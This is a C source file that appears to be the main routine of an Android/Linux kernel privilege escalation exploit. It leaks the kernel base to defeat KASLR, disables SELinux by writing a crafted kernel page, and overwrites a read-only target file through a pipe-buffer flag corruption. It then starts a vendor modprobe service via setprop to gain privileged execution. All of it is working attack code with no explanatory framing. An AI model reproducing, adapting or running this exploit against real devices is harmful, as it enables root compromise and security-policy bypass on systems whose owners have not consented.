#include "common.h"

static int selinux_write(void) {
  int enforcing = is_selinux_enforcing();
  if (!enforcing) {
    pr_success("Selinux already disabled.\n");
    return 0;
  }
  pr_info("Disabling selinux\n");
  for (int i = 0; i < SELINUX_PHASE_ATTEMPTS; i++) {
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SELINUX);
    if (!page_base) {
      pr_warning("Preparing kernel page attempt %d: Failed\n", i + 1);
      continue;
    }
    run_main_route_threads();
    if (route_verified) {
      pr_success("Selinux disabled.\n");
      return 0;
    }
    pr_warning("Selinux attempt %d: Failed\n", i + 1);
  }
  pr_error("Failed to disable Selinux\n");
  return 1;
}

static int pipe_flag_write(void) {
  pr_info("Starting pipe_flag phase\n");
  for (int attempt = 0; attempt < PIPE_FLAG_PHASE_ATTEMPTS; attempt++) {
    if (attempt > 0)
      reset_pipe_attempt();

    pr_info("pipe flag phase: preparing pipe buffer page (attempt %d)\n", attempt + 1);
    pipebuf_page_base = prepare_pipe_buffer_page();
    pr_info("pipe flag phase: pipebuf_page_base=%016zx\n", pipebuf_page_base);
    if (!pipebuf_page_base) {
      pr_warning("pipe flag phase: prepare_pipe_buffer_page failed attempt %d\n", attempt + 1);
      continue;
    }

    int overwrite_fd = open(pipe_overwrite_target(), O_RDONLY);
    if (overwrite_fd < 0) {
      pr_error("pipe flag phase: cannot open %s errno=%d\n",
               pipe_overwrite_target(), errno);
      return 1;
    }
    for (int i = 0; i < PIPE_RECLAIM; i++) {
      off64_t off = 0;
      int ret = splice(overwrite_fd, &off, pipe_fds_reclaim[i][1], NULL, 1, 0);
      if (ret <= 0) {
        pr_error("pipe flag phase: splice failed i=%d ret=%d errno=%d\n",
                 i, ret, errno);
      }
    }
    close(overwrite_fd);

    pin_to_core(CORE);
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_PIPE_FLAG);
    if (!page_base) {
      pr_warning("Preparing kernel page attempt %d: Failed\n", attempt + 1);
      continue;
    }

    run_main_route_threads();

    if (route_verified) {
      pr_info("pipe flag phase: overwrite succeeded on attempt %d\n", attempt + 1);
      break;
    }
    pr_warning("pipe flag phase: attempt %d failed\n", attempt + 1);
  }

  if (!route_verified) {
    pr_warning("pipe flag phase: all attempts exhausted\n");
    if (pipe_prepare_child > 0) {
      kill(pipe_prepare_child, SIGKILL);
      waitpid(pipe_prepare_child, NULL, 0);
      pipe_prepare_child = -1;
    }
    return 1;
  }

  pr_info("pipe flag phase: running setprop\n");
  system("setprop ctl.start vendor.modprobe");

  if (pipe_prepare_child > 0) {
    kill(pipe_prepare_child, SIGKILL);
    waitpid(pipe_prepare_child, NULL, 0);
    pipe_prepare_child = -1;
  }
  return 0;
}

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  set_unbuffer();
  set_limit();
  pin_to_core(CORE);
  init_p0_from_env();
  
#ifdef ANDROID_TARGET
  if (!slide_leak_kernel_base()) {
    pr_error("tracefs kaslr leak failed\n");
    return 1;
  }
  pr_info("tracefs kaslr leak done.\n");
  if (getenv("SLIDE_ONLY")) {
    pr_success("SLIDE_ONLY set; stopping before selinux write\n");
    return 0;
  }
#endif

  atomic_store(&current_phase, PHASE_SELINUX);
  if (!getenv("SKIP_SELINUX")) {
    if (selinux_write()) {
      pr_info("Selinux overwrite failed.\n");
      return 1;
    }
  } else {
    pr_info("SKIP_SELINUX set; going straight to pipe flag\n");
  }
  atomic_store(&current_phase, PHASE_PIPE_FLAG);
  return pipe_flag_write();
}
